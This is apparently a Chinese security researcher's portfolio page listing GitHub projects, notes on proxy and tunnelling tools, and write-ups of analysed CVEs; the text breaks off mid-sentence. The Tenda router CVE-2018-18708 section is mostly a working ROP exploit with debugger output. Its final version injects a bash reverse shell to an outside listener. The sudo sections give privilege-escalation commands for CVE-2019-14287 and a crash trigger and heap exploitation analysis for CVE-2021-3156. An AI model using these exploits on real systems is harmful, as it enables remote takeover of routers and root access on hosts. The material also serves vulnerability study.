批量攻击脚本\nhttps://github.com/i0gan/awd_script\nAWD批量攻击脚本(Web&#x2F;Pwn通用)，通过bash编写，远程信息采用参数传入exp，通过多进程方式实现同时攻打，阻塞超时自动结束进程。\nGsky自研高性能游戏服务器库\nhttps://github.com/pwnsky/gsky\n为了便于更快速开发高性能游戏服务器，特意基于lgx web服务器框架，二次开发且封装为一个服务器库。 gsky是一个基于epoll 边缘触发架构的高性能游戏服务器库，采用更快速的pp (pwnsky protocol)二进制加密双向协议进行传输数据，服务端支持异步消息推送，日志打印与日志文件写入等，让使用者更专注与游戏逻辑开发。\nCTF Avoid PyCTF网络安全大赛中很实用的防止PY工具，在PWN这里一抓一个准！\nhttps://github.com/pwnsky/ctf-avoid-py\nCTF大赛中很实用的防止PY工具，国内的PY现象日渐泛滥，在这种趋势下，想要赛选出真正有实力的选手还得看举办方的一个比赛规则的规定，也是举办方与参赛选手的一种对抗。再此呢，我开发了skyaf工具，在CTF PWN中十抓九准！曾经实践于2021安洵杯所有pwn题中，大家有兴趣的话，可以看一下当时的流量抓取情况，这里不提供审计结果报告，只提供原始数据。\nPP-SDKGsky客户端SDK\nhttps://github.com/pwnsky/GskyClient\npp 协议，全称为 pwnsky protocol, 是一款吸收http部分特性的一款二进制传输协议，主要用于游戏长连接交互协议，目前基于tcp来实现。\n该协议头部只占16字节，相对与http更小，由于协议字段都在固定位置，解析起来更快速。\npp协议中定义有状态码，数据类型，数据长度，请求路由。\n采用pe (pwnsky encryption)进行数据加密，由服务端随机生成8字节密钥返回给客户端，客户端接收到之后，在断开之前传输数据都采用该密钥进行加解密。\nSquickhttps://github.com/pwnsky/Squick\nSquick是采用C++开发的元宇宙、MMO游戏服务器快速开发方案，支持局部热重载、插件化开发、与客户端实现帧同步，可快速开发元宇宙、MMO游戏项目等。\n特性\n\n采用动态连链接库方式动态加载插件，开发拓展插件，让开发服务器变成开发插件\n插件化管理方式，可对插件进行加载与卸载实现不用关掉程序，就可以实现热重载功能。\n遵守谷歌C++编程规范\n事件和属性驱动，让开发变得更简单\nExcel文档配置\n日志捕获系统\n支持部分不用停服即可热更，动态实现替换插件\n默认拥有服务器插件：代理服务器、世界服务器、导航系统、数据库服务器、中心服务器、登录服务器\n分布式服务、各服务之间通过网络来进行沟通，可通过分布式+集群方式减轻服务器压力\n拥有协程异步、事件与属性驱动，提升开发效率\nLua热更新、热重载、lua脚本可管理c++插件以及lua插件。通过lua可以动态热更新c++层面的插件(.so文件)，实现lua热更以及c++ native层的热热更新。\n采用Redis + Mysql作为数据库，通过数据库服务器，让数据灵活存储。\n\nUquickhttps://github.com/pwnsky/Uquick\nUnity3d元宇宙和MMO游戏的快速开发方案，支持冷更新+热更新、微信登录、帧同步、状态同步。\n特性\n使Unity开发的游戏支持热更新的解决方案\n仅需下载并打开框架，就可以开始制作可热更新的游戏，无额外硬性要求。\n框架进行了集成以及完善的封装，无需关注热更原理即可使用强大的功能。\n动画系统同步\n位置、旋转同步\n场景对象基本信息同步\n代理正向代理在靶机服务器上运行代理程序监听端口，用自己的电脑直接连接即可。这种情况是靶机能够开放其他端口出来，用户能够访问到靶机上监听的端口。\n工具：\ngoproxy、ew\n反向代理在自己的电脑或vps上用代理程序监听端口，然后再在靶机服务器上运行代理客户端来连接代理监听的端口，即可实现用户通过该模式用到靶机服务器上的网络环境。\n这种情况是靶机不能够开放其他端口出来，但靶机能够访问vps或者用户电脑。\n工具：\ngoproxy、ew\n隧道采用隧道连接程序，访问网站的特定URL，服务端运行了特定的代理代码，让http协议转化成一个原生socket，且不断开连接，之后走的代理就根据该socket来传输数据。\n这种情况是靶机不能够开放其他端口出来，靶机也不能能够访问vps或者用户电脑，但选手能够访问到靶机网站。\n工具：NeoreGeorg\n端口转发将一个绑定的端口在不修改任何源服务的情况下，再次将该服务端口绑定在另一个端口上，比如我内网服务器1开启了个web服务，绑定端口为80，内网服务器2能够访问该内网服务器1且公网也能够访问内网服务器1，我们再不修改内网服务器1的服务情况下，将其服务绑定在内网服务器2，这样外网就能够访问到该服务了，每一次连接内网服务器2的时候，它会主动去与内网服务器1进行连接，从而将内网服务器2的数据经过端口转发给了内网服务器1。\n内网穿透内网穿透是将内网服务经过两层代理将其服务公布在公网上的一种手段，让其他能够访问公网的用户也能够访问到内网服务。\n工具：\ngoproxy、ew\nN级代理搭建在内网中，出现了多个层级的靶机，我们就需要搭建N级代理了，让我们的代理呈现出一种链式的，goproxy也可以在该代理链中随意切换代理到任意节点，十分方便。\n工具：\ngoproxy、ew\n分析过的CVE这里就说一下自己以前分析过的CVE吧，其实在打CTF比赛中，也遇到很多CVE，比如malloc函数的cve、CJson、v8的CVE等等，然后根据poc结合环境来利用的。\n路由器CVE-2018-18708CVE-2018-18708，多款Tenda产品中的httpd存在缓冲区溢出漏洞。攻击者可利用该漏洞造成拒绝服务（覆盖函数的返回地址）。以下产品和版本受到影响：Tenda AC7 V15.03.06.44_CN版本；AC9 V15.03.05.19(6318)_CN版本；AC10 V15.03.06.23_CN版本；AC15 V15.03.05.19_CN版本；AC18 V15.03.05.19(6318)_CN版本。\n漏洞点signed int __fastcall vul_end(const char *a1, char *a2) # offset 000BE73C&#123;  signed int v2; // r3  char *dest; // [sp+8h] [bp-3Ch]  char *str; // [sp+Ch] [bp-38h]  int v6; // [sp+10h] [bp-34h]  int v7; // [sp+14h] [bp-30h]  int v8; // [sp+18h] [bp-2Ch]  int v9; // [sp+1Ch] [bp-28h]  int s2; // [sp+20h] [bp-24h]  int v11; // [sp+24h] [bp-20h]  int v12; // [sp+28h] [bp-1Ch]  int v13; // [sp+2Ch] [bp-18h]  char v14; // [sp+32h] [bp-12h]  char v15; // [sp+33h] [bp-11h]  char *src; // [sp+34h] [bp-10h]  str = (char *)a1;  dest = a2;  src = strchr(a1, 13); //检测deviceList内容是否包含’\\r’，随后进入分支执行漏洞代码。  if ( src )  &#123;    *src++ = 0;    v6 = 0;    v7 = 0;    v8 = 0;    v9 = 0;    if ( GetValue(&quot;cgi_debug&quot;, &amp;v6) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;v6) )    &#123;      v15 = 1;      printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;parse_macfilter_rule&quot;, 807, off_FCFE4[0]);      printf(&quot;parase rule: name == %s, mac == %s\\n\\x1B[0m&quot;, str, src);    &#125;    strcpy(dest + 32, str); // 漏洞点vul    strcpy(dest, src); // 漏洞点    v2 = 0;  &#125;  else  &#123;    s2 = 0;    v11 = 0;    v12 = 0;    v13 = 0;    if ( GetValue(&quot;cgi_debug&quot;, &amp;s2) &amp;&amp; !strcmp(&quot;on&quot;, (const char *)&amp;s2) )    &#123;      v14 = 2;      printf(&quot;%s[%s:%s:%d] %s&quot;, off_FCFEC[0], &quot;cgi&quot;, &quot;parse_macfilter_rule&quot;, 803, off_FCFE8[0]);      printf(&quot;source_rule error: %s!\\n\\x1B[0m&quot;, str);    &#125;    v2 = 2;  &#125;  return v2;&#125;\n\nsub_2E128 -&gt; sub_2E6F4 -&gt;sub_41F18 -&gt; formSetMacFilterCfg -&gt; sub_BD758 -&gt; sub_BDA1C -&gt; sub_BE73C\n那么现在我们就可以访问“&#x2F;goform&#x2F;setMacFilterCfg”时会进入formSetMacfiltercfg函数，传入类似与json的数据进行解析，则会将value值传入漏洞触发点。\nexp#! /usr/bin/python3import requestsurl = &quot;http://10.10.10.10/goform/setMacFilterCfg&quot;p = &#x27;A&#x27; * 0x1000d = &#123;&quot;macFilterType&quot;: &quot;white&quot;, &quot;deviceList&quot;: &#x27;\\r&#x27;+ &#x27;A&#x27; * 0x1000&#125;r = requests.post(url, d)print(r.text)\n\nlog输出如下\n┌[logan☮arch]-(~/share/nu1l/babyroute)└&gt; python poc&#123;&quot;errCode&quot;:2&#125;\n\n发现不能运行到我们的位置，进行再调试调试看看是那块没有绕过。重新下断电在formSetMacFilterCfg函数，偏移为: 000BCB9C\n发现能够调用到formSetMacFilterCfg函数，但没法继续调用下一个函数，再来分析分析还有什么条件没有绕过。\n  0xbd3a0    sub    r3, fp, #0x24  0xbd3a4    ldr    r2, [pc, #0x36c]  0xbd3a8    add    r2, r4, r2  0xbd3ac    mov    r0, r2  0xbd3b0    mov    r1, r3► 0xbd3b4    bl     #0xf2f8 &lt;0xf2f8&gt;  0xbd3b8    mov    r3, r0  0xbd3bc    cmp    r3, #0  0xbd3c0    beq    #0xbd458 &lt;0xbd458&gt;\n\n执行到GetValue的时候， 会出现http响应错误，然而该函数是调用lib的，只能先分析一下lib。\n通过分析lib中的GetValue函数，会议cookie值检测，需要包含password等字段，内容随便伪造。\npoc如下\n触发poc#! /usr/bin/python3import requestsurl = &quot;http://10.10.10.10/goform/setMacFilterCfg&quot;c = &#123;&quot;Cookie&quot;:&quot;password=0&quot;&#125;p = &#x27;A&#x27; * 0x1000d = &#123;&quot;macFilterType&quot;: &quot;black&quot;, &quot;deviceList&quot;: &#x27;\\r&#x27;+ &#x27;A&#x27; * 0x1000&#125;r = requests.post(url, cookies = c, data = d)print(r.text)\n\n漏洞触发如下\n*R0   0x0*R1   0x3ffef110 ◂— 0*R2   0x3ff4c020 ◂— stm    r0!, &#123;r5&#125;*R3   0x0*R4   0x41414141 (&#x27;AAAA&#x27;) R5   0x11bf40 ◂— str    r7, [r5, #0x70] /* 0x666f672f; &#x27;/goform/setMacFilterCfg&#x27; */ R6   0x1 R7   0x408007fb ◂— 0x41414141 (&#x27;AAAA&#x27;) R8   0xe968 ◂— stm    r0!, &#123;r0, r2, r3&#125; R9   0x2e128 ◂— ldr    r0, [pc, #0x40] R10  0x40800668 ◂— 0x41414141 (&#x27;AAAA&#x27;)*R11  0x41414141 (&#x27;AAAA&#x27;)*R12  0x3ff47edc —▸ 0x3ff3da50 ◂— adds   r0, #0*SP   0x40800098 ◂— 0x41414141 (&#x27;AAAA&#x27;)*PC   0x41414140 (&#x27;@AAA&#x27;)───────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────Invalid address 0x41414140\n\n这时发现，已经修改了PC寄存器，实现了劫持。\n漏洞利用接下来就计算偏移找system函数了。\n─────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────── R0   0x407fffe4 ◂— 0x0 R1   0x11ee31 ◂— &#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC&#x27; R2   0x407fffe4 ◂— 0x0 R3   0x11ee31 ◂— &#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC&#x27; R4   0xfab18 —▸ 0xfa9d0 ◂— 1 R5   0x11c0e0 ◂— strbtvs r6, [pc], -pc, lsr #14 /* 0x666f672f; &#x27;/goform/setMacFilterCfg&#x27; */ R6   0x1 R7   0x408007fb ◂— &#x27;./pwn/httpd&#x27; R8   0xe968 ◂— mov    ip, sp R9   0x2e128 ◂— push   &#123;r4, fp, lr&#125; R10  0x40800668 ◂— 0x0 R11  0x407ffe94 —▸ 0xbdb80 ◂— sub    r3, fp, #0x1d0 R12  0xfaf60 —▸ 0x3fdda508 ◂— mov    r3, r0 SP   0x407ffe50 ◂— 0x0*PC   0xbe9a4 ◂— bl     #0xf640──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────   0xbe990    bl     #0xf640 &lt;0xf640&gt;    0xbe994    ldr    r2, [fp, #-0x3c]   0xbe998    ldr    r3, [fp, #-0x10]   0xbe99c    mov    r0, r2   0xbe9a0    mov    r1, r3 ► 0xbe9a4    bl     #0xf640 &lt;0xf640&gt;65:0194│ r0    0x407fffe4 ◂— &#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC&#x27;... ↓74:01d0│       0x40800020 ◂— &#x27;BBBBCCCC&#x27;75:01d4│       0x40800024 ◂— &#x27;CCCC&#x27;76:01d8│ r3-1  0x40800028 ◂— 0x0... ↓8d:0234│       0x40800084 ◂— 0x1f8e:0238│       0x40800088 —▸ 0xf0bc8 ◂— ldmdbvs r6!, &#123;r2, r5, r6, r8, sl, sp, lr&#125; ^ /* &#x27;deviceList&#x27; */\n\n堆栈数据如上，由于是如下进行弹堆栈的，需要再填充(0x238 - 0x1d4)个字节才可以修改pc寄存器，实现劫持。\n.text:000BE9AC                 MOV             R0, R3.text:000BE9B0                 SUB             SP, R11, #8.text:000BE9B4                 LDMFD           SP!, &#123;R4,R11,PC&#125;\n\n重新修改poc\n#! /usr/bin/python3import requestsurl = &quot;http://10.10.10.10/goform/setMacFilterCfg&quot;c = &#123;&quot;Cookie&quot;:&quot;password=0&quot;&#125;p = &#x27;A&#x27; * 0xA8p += &#x27;DDDD&#x27;p += &#x27;EEEE&#x27;p += &#x27;FFFF&#x27;d = &#123;&quot;macFilterType&quot;: &quot;black&quot;, &quot;deviceList&quot;: &#x27;\\r&#x27;+ p&#125;r = requests.post(url, cookies = c, data = d)\n\n运行如下，那么就可以知道在哪可以实现修改pc寄存器了。\n*R11  0x45454545 (&#x27;EEEE&#x27;)*R12  0x3ff47edc —▸ 0x3ff3da50 ◂— mov    r3, r0*SP   0x40800098 ◂— &#x27;GGGGHHHH&#x27;*PC   0x46464646 (&#x27;FFFF&#x27;)──────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────Invalid address 0x46464646\n\n由于程序没有开启alsr与pie那么glibc中的基址是固定的。\n直接算获取system地址。vmmap获取glibc基址为0xf659b000\n在libc中找到system函数偏移\n┌[logan☮arch]-(~/share/nu1l/babyroute)└&gt; readelf -s docker/pwn/lib/libc.so.0  | grep system   433: 0005a270   348 FUNC    WEAK   DEFAULT    7 system   904: 00047b38    80 FUNC    GLOBAL DEFAULT    7 svcerr_systemerr  1394: 0005a270   348 FUNC    GLOBAL DEFAULT    7 __libc_syste\n\n这里记得检查下CPSR寄存器的T位，因为栈上内容弹出到PC寄存器时，其最低有效位（LSB）将被写入CPSR寄存器的T位，而PC本身的LSB被设置为0。如果T位值为1，需要在地址上加一还原。\npwndbg&gt; p/t $cpsr$1 = 1100000000000000000000000010000pwndbg&gt; cyclic -l taab176\n\n寻找gadgetsgadget1\n用于修改r3寄存器\n┌[logan☮arch]-(~/share/nu1l/babyroute)└&gt; ROPgadget --binary docker/pwn/lib/libc.so.0 --only &quot;pop&quot; | grep r3...0x00018298 : pop &#123;r3, pc&#125;...\n\ngadget2\n┌[logan☮arch]-(~/share/nu1l/babyroute)└&gt; ROPgadget --binary ./docker/pwn/lib/libc.so.0  | grep &quot;mov r0, sp ; blx r3&quot;...0x00040cb8 : mov r0, sp ; blx r3...\n\npayload结构为[offset, gadget1, system_addr, gadget2, cmd]\n先将system函数地址储存在r3寄存器中，执行到gadget2将sp的值赋给r0，也就是将sp作为system的参数，而这时sp指向的是cmd。\npoc#! /usr/bin/python3import requestsfrom pwn import *url = &quot;http://10.10.10.10/goform/setMacFilterCfg&quot;c = &#123;&quot;Cookie&quot;:&quot;password=0&quot;&#125;libc_base = 0xf659b000system  = libc_base + 0x0005a270gadget1 = libc_base + 0x00018298gadget2 = libc_base + 0x00040cb8cmd = b&#x27;touch test\\x00&#x27;p = b&#x27;A&#x27; * 0xA8p += b&#x27;DDDD&#x27;p += b&#x27;EEEE&#x27;p += p32(gadget1)p += p32(system)p += p32(gadget2)p += cmdd = &#123;&quot;macFilterType&quot;: &quot;black&quot;, &quot;deviceList&quot;: &#x27;\\r&#x27;+ p&#125;r = requests.post(url, cookies = c, data = d)print(r.text)\n\n修改url 为docker所转发的端口，现在试试在docker上是否已经创建test文件\nroot@a52d03d064d3:/# lsbin   dev  flag  lib    media  opt   pwn   run   srv       sys   tmp  varboot  etc  home  lib64  mnt    proc  root  sbin  start.sh  test  usr\n\n可以看到已经创建了test文件。\n那么如何实现交互呢?就采用bash下来反弹sehll 吧。\n先在自己的服务器上使用nc来监听。\nnc -lvnp 4444\n\n在poc中的命令填写为\nbash -i &gt;&amp; /dev/tcp/192.168.43.13/4444 0&gt;&amp;1\n\n192.168.43.13是我物理机的ip,4444是我nc监听的端口。\n现在poc为\n#! /usr/bin/python3import requestsfrom pwn import *url = &quot;http://127.0.0.1:2333/goform/setMacFilterCfg&quot;c = &#123;&quot;Cookie&quot;:&quot;password=0&quot;&#125;libc_base = 0xf659b000system  = libc_base + 0x0005a270gadget1 = libc_base + 0x00018298gadget2 = libc_base + 0x00040cb8cmd = b&#x27;bash -i &gt;&amp; /dev/tcp/192.168.43.13/4444 0&gt;&amp;1&#x27;p = b&#x27;A&#x27; * 0xA8p += b&#x27;DDDD&#x27;p += b&#x27;EEEE&#x27;p += p32(gadget1)p += p32(system)p += p32(gadget2)p += cmdd = &#123;&quot;macFilterType&quot;: &quot;black&quot;, &quot;deviceList&quot;: &#x27;\\r&#x27;+ p&#125;r = requests.post(url, cookies = c, data = d)print(r.text)\n\n在服务器上开启监听：\nnc -lvnp 4444\n\n火狐浏览器CVE-2016-9079火狐浏览器上暴露的一个 JavaScript漏洞，而且已经被用于攻击 Tor 用户。该漏洞是一个存在于SVG Animation模块中的释放后UAF漏洞，当用户使用Firefox浏览包含恶意Javascript和SVG代码的页面时，会允许攻击者在用户的机器上远程执行代码。受该漏洞影响的平台包括Windows，Mac OS以及Linux。\n攻击者通过堆喷射技术在内存中大量分配填充预定义的指令从而绕过地址空间随机化（ASLR）\n需要通过msfvnom来生成python的payload，在通过一个脚本，将其转换为js代码，浏览器直接访问页面即可RCE。\nCVE-2016-1960是火狐浏览器上的一个漏洞，HTML5 字符串解析器中的 nsHtml5TreeBuilder 类中的整型溢出允许攻击者通过利用对结束标签的错误处理来任意代码执行。\nV8Linux 提权CVE-2019-14287它是一个提权cve，利用条件是首先该用户是在&#x2F;etc&#x2F;sudoer中配置得有sudo权限的，在黑客不知道用户密码的情况下，能够提权为root。\n条件：\n用户需要拥有sudo权限，并允许用户使用任意用户ID来运行命令。意味着用户的sudoer项在Runas规范中定义了特殊的ALL值。\n如果sudoer策略允许的话，sudo支持由用户指定的用户名或用户ID来运行命令。比如说，下列sudoer项允许我们以任意用户的身份来运行id命令，因为在Runas规范中它包含了ALL关键字。\nalice myhost = (ALL) /usr/bin/id\n\n除了以任意有效用户的身份运行id命令之外，我们还能够以任意用户ID来运行该命令，此时需要使用#uid语句：\nsudo -u#1234 id -u\n\n该命令将返回“1234”。但是，sudo可以使用setresuid(2)和setreuid(2)这两个系统调用来在命令运行之前修改用户ID，并将用户ID修改为-1（或未签名的等价用户ID-4294967295）：\nsudo -u#-1 id -u\n\n或  \nsudo -u#4294967295 id -u\n\n上述命令运行之后，将返回“0”。这是因为sudo命令本身已经在以用户ID“0”运行了，所以当sudo尝试将用户ID修改为“-1”时，不会发生任何变化。\n但是，sudo日志条目中记录下的命令运行用户的ID为“4294967295”，而并非root用户（或用户ID为“0”），除此之外，因为用户ID是通过-u选项指定的，并且不会在密码数据库中存储，所以PAM会话模块也不会运行。\n如果sudoer条目允许用户以任意用户身份运行命令（非root），那么攻击者就可以利用该漏洞来绕过这种限制了。比如说，我们有下列sudoer条目：\nbob myhost = (ALL, !root) /usr/bin/vi\n\n用户bob能够以除了root之外的其他任意用户身份来运行命令vi，但由于该漏洞的存在，bob实际上能够通过下列命令来以root权限运行vi命令，并绕过目标系统中的安全策略：\nsudo -u#-1 vi\n\n只有当包含了ALL关键词的sudoer条目存在于Runas规范中时，该漏洞才存在。比如说，如果规范中包含下列sudoer条目的话，目标系统是不会受到该漏洞影响的：\nalice myhost = /usr/bin/id\n\n在上述例子中，alice只能够以root权限运行id命令，任何以不同身份用户运行命令的尝试都将被拒绝。\nCVE-2021-3156CVE-2021-3156 漏洞主要成因在于sudo中存在一个基于堆的缓冲区溢出漏洞，当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码\ncrash\nsudoedit -s &#x27;\\&#x27; `python3 -c &quot;print(&#x27;A&#x27;*80)&quot;`  \n\n跟进main函数，然后会执行policy_check函数\nstatic int policy_check(struct plugin_container *plugin, int argc, char * const argv[],      char *env_add[], char **command_info[], char **argv_out[],      char **user_env_out[])  &#123;      int ret;      debug_decl(policy_check, SUDO_DEBUG_PCOMM)     if (plugin-&gt;u.policy-&gt;check_policy == NULL) &#123;      sudo_fatalx(U_(&quot;policy plugin %s is missing the `check_policy&#x27; method&quot;),          plugin-&gt;name);      &#125;      sudo_debug_set_active_instance(plugin-&gt;debug_instance);      ret = plugin-&gt;u.policy-&gt;check_policy(argc, argv, env_add, command_info,      argv_out, user_env_out);      sudo_debug_set_active_instance(sudo_debug_instance);      debug_return_int(ret);  &#125;  \n\n会发现程序执行流走向了plugin-&gt;u.policy-&gt;check_policy(argc, argv, env_add, command_info，argv_out, user_env_out);\nsudoers_policy_check(int argc, char * const argv[], char *env_add[],      char **command_infop[], char **argv_out[], char **user_env_out[])  &#123;      struct sudoers_exec_args exec_args;      int ret;      debug_decl(sudoers_policy_check, SUDOERS_DEBUG_PLUGIN)        if (!ISSET(sudo_mode, MODE_EDIT))      SET(sudo_mode, MODE_RUN);        exec_args.argv = argv_out;      exec_args.envp = user_env_out;      exec_args.info = command_infop;       ret = sudoers_policy_main(argc, argv, 0, env_add, &amp;exec_args);      if (ret == true &amp;&amp; sudo_version &gt;= SUDO_API_MKVERSION(1, 3)) &#123;      /* Unset close function if we don&#x27;t need it to avoid extra process. */      if (!def_log_input &amp;&amp; !def_log_output &amp;&amp; !def_use_pty &amp;&amp;          !sudo_auth_needs_end_session())          sudoers_policy.close = NULL;      &#125;      debug_return_int(ret);  &#125;  \n\n函数非常简短，基本就是设置一些变量，然后就去调用了sudoers_policy_main函数，继续跟进到sudoers_policy_main函数中：\nint  sudoers_policy_main(int argc, char * const argv[], int pwflag, char *env_add[],      void *closure)  &#123;      ··· ···      /*      * Make a local copy of argc/argv, with special handling      * for pseudo-commands and the &#x27;-i&#x27; option.      */      if (argc == 0) &#123;      ··· ···      &#125; else &#123;      /* Must leave an extra slot before NewArgv for bash&#x27;s --login */      NewArgc = argc;      NewArgv = reallocarray(NULL, NewArgc + 2, sizeof(char *));     ··· ···      &#125;      memcpy(++NewArgv, argv, argc * sizeof(char *));      NewArgv[NewArgc] = NULL;      ··· ···      &#125;      &#125;      ··· ···      cmnd_status = set_cmnd();      ··· ···  &#125;  \n\n\n\n先是传了一些参数，然后调用set_cmnd，我在gdb调的时候用的命令是sudoedit -s ‘\\’ aaaaaaaa\n漏洞点看看set_cmnd做了什么\nstatic int  set_cmnd(void)  &#123;      ··· ···      /* set user_args */      if (NewArgc &gt; 1) &#123;          char *to, *from, **av;          size_t size, n;            /* Alloc and build up user_args. */          //根据参数总长度计算size， 后续malloc 申请，没有问题          for (size = 0, av = NewArgv + 1; *av; av++)          size += strlen(*av) + 1;          if (size == 0 || (user_args = malloc(size)) == NULL) &#123;          sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;));          debug_return_int(-1);         &#125;          if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;          /*          * When running a command via a shell, the sudo front-end          * escapes potential meta chars.  We unescape non-spaces          * for sudoers matching and logging purposes.          */           //将所有参数拷贝到一起放到堆中，逻辑是遇到&#x27;\\&#x27;加非空格类型字符则只拷贝非空格字符           //但这里\\x00 并不算空格类型字符           //他没有考虑参数如果只有一个&#x27;\\&#x27;或以&#x27;\\&#x27;结尾并且下两个字符后就是另一个字符串情况          for (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123;              while (*from) &#123;              if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1]))                  from++;              *to++ = *from++;              &#125;              *to++ = &#x27; &#x27;;          &#125;          *--to = &#x27;\\0&#x27;;          &#125;        ··· ···      &#125;    &#125;    ··· ···  &#125;\n\n同样也是省略了一些不需要分析的代码\n走到这里，我们终于来到了溢出点，我们输入的参数就是在这里被存进堆中，我们将这段代码切割成小的代码片来分析它的意图\n首先是申请内存部分：\nfor (size = 0, av = NewArgv + 1; *av; av++)          size += strlen(*av) + 1;          if (size == 0 || (user_args = malloc(size)) == NULL) &#123;          sudo_warnx(U_(&quot;%s: %s&quot;), __func__, U_(&quot;unable to allocate memory&quot;));          debug_return_int(-1);          &#125; \n\n这里计算了每一个参数的长度，然后把他们加到一起，得到一个size，然后malloc(size)，这里的意图很明显，就是算一下想要装下所有的参数需要多大的空间，然后申请出来，指针给到user_args\n接下来是拷贝部分：\nfor (to = user_args, av = NewArgv + 1; (from = *av); av++) &#123;              while (*from) &#123;              if (from[0] == &#x27;\\\\&#x27; &amp;&amp; !isspace((unsigned char)from[1]))                  from++;              *to++ = *from++;              &#125;              *to++ = &#x27; &#x27;;          &#125;          *--to = &#x27;\\0&#x27;;  \n\n这里就是漏洞所在，它把每个参数取出来，让from指针指向参数内容，to指针则指向堆内存，然后判断如果是反斜杠+非空格字符这种结构，就只拷贝后面这个字符，不拷贝反斜杠。参数与参数之间是用空格分割。这里我们先仔细关注一下NewArgv是怎么保存的我们的参数。\n触发漏洞的路径可以总结为：sudo.c : mainsudo.c : policy_checkpolicy.c : sudoerrs_policy_checksudoers.c : sudoers_policy_mainsudoers.c : set_cmndsudoers.c : 859\n利用手法分析本漏洞利用手法有一定的堆布局难度，是通过堆溢出覆盖nss_load_library函数加载so的时候需要用到的结构体service_user，覆盖此结构体中的so名字符串，这样就可以让程序加载我们指定的so文件，从而完成任意代码执行的。我们要做的事情有两个：1.搞清楚nss_load_library的函数调用流程和相关的数据结构机制2.setlocale 如何通过环境变量LC_* 进行堆布局\n漏洞利用关键代码片段：\nstatic int  nss_load_library (service_user *ni)  &#123;    if (ni-&gt;library == NULL)  &#123;        static name_database default_table;        ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,                       ni-&gt;name);        if (ni-&gt;library == NULL)      return -1;      &#125;      if (ni-&gt;library-&gt;lib_handle == NULL)      &#123;        ··· ···        __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,                            &quot;libnss_&quot;),                      ni-&gt;name),                &quot;.so&quot;),          __nss_shlib_revision);          ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);        ··· ···   &#125;  &#125;  \n\nni为堆上的service_user 结构体，当 ni-&gt;library-&gt;lib_handle 为NULL 时，就会调用__libc_dlopen 进行 so 装载，只要我们能够通过堆溢出将ni-&gt;library覆盖为0，就会让程序调用nss_new_service函数让ni结构体重新初始化，刚初始化后的ni-&gt;library-&gt;lib_handle一定为0，所以会运行到下面的代码块，执行到__libc_dlopen 函数。这里是漏洞利用的核心代码，接下来我们考虑如何实现精准的堆溢出来覆盖ni结构体，这就要提到nss机制，首先&#x2F;etc&#x2F;目录下有一个文件&#x2F;etc&#x2F;nsswitch.conf，来看看里面写了些啥\n它规定了程序在查找so方法的时候采用何种途径和顺序然后来看三个结构体的内容\ntypedef struct service_user  &#123;    /* And the link to the next entry.  */   struct service_user *next;    /* Action according to result.  */    lookup_actions actions[5];    /* Link to the underlying library object.  */    service_library *library;    /* Collection of known functions.  */    void *known;    /* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...).  */    char name[0];  &#125; service_user;  typedef struct name_database_entry  &#123;    /* And the link to the next entry.  */    struct name_database_entry *next;    /* List of service to be used.  */    service_user *service;    /* Name of the database.  */    char name[0];  &#125; name_database_entry;  typedef struct name_database  &#123;    /* List of all known databases.  */    name_database_entry *entry;    /* List of libraries with service implementation.  */    service_library *library;  &#125; name_database; \n\n\n\n在__nss_database_lookup函数中，如果全局入口 service_table 为空，则会调用 nss_parse_file 进行初始化，相关代码如下：\nint  __nss_database_lookup (const char *database, const char *alternate_name,  const char *defconfig, service_user **ni)  \t&#123;  \t··· ···  \t/* Are we initialized yet?  */  \tif (service_table == NULL)  \t/* Read config file.  */  \tservice_table = nss_parse_file (_PATH_NSSWITCH_CONF);  \t··· ···  &#125;\n\n然后继续看nss_parse_file是如何实现的：\nstatic name_database *  nss_parse_file (const char *fname)  &#123;  ​\tFILE *fp;  ​\tname_database *result;  ​\tname_database_entry *last;  ​\t··· ···  4.  //打开/etc/nsswitch.conf  5.  fp = fopen (fname, &quot;rce&quot;);  6.  ··· ···  7.  result = (name_database *) malloc (sizeof (name_database));  8.  ··· ···  9.  do  10.  &#123;  11.  name_database_entry *this;  12.  ssize_t n;  13.  n = __getline (&amp;line, &amp;len, fp);// getline 这里会申请一个0x80 大小的chunk  14.  15.  ··· ···  16.  17.  this = nss_getline (line);  18.  if (this != NULL)  19.  &#123;  20.  if (last != NULL)  21.  last-&gt;next = this;  22.  else  23.  result-&gt;entry = this;  24.  25.  last = this;  26.  &#125;  27.  &#125;  28.  while (!feof_unlocked (fp));  29.  30.  /* Free the buffer.  */  31.  free (line); //在函数返回之前会将getline 函数申请的0x80 chunk 释放掉。  32.  /* Close configuration file.  */  33.  fclose (fp);  34.  35.  return result;       &#125;  \n\n到这里大概梳理一下程序逻辑，程序会打开&#x2F;etc&#x2F;nsswitch.conf，文件，读入内容并根据内容建立堆快结构，最后形成如下结构：\n\n这七个chunk是在同一个函数中一次性申请出来的除此之外，值得注意的是，在 nss_parse_file 函数中有一个 __getline 函数，该函数会根据读入内容的长度申请一个chunk，并且这个chunk 会在最后 nss_parse_file 函数返回时被释放。由于&#x2F;etc&#x2F;nsswitch.conf 里面内容格式基本最长的一行就是注释了，而且我们不可控该文件，所以这里可以认为每次 